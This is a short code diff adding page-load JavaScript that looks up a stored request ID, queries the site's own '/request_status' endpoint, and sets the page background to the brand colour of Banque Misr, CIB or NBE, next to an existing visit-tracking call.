@@ -69,6 +69,21 @@
     </div>
 
     <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            const requestId = localStorage.getItem("request_id");
+            if (requestId) {
+                fetch('/request_status/' + requestId)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.data && data.data.bank) {
+                        const bank = data.data.bank;
+                        if (bank === 'Banque Misr') document.body.style.backgroundColor = '#b01c1c';
+                        else if (bank === 'CIB') document.body.style.backgroundColor = '#004b91';
+                        else if (bank === 'NBE') document.body.style.backgroundColor = '#006b3f';
+                    }
+                });
+            }
+        });
         fetch('/track_visit', {
             method: 'POST',
             headers: {
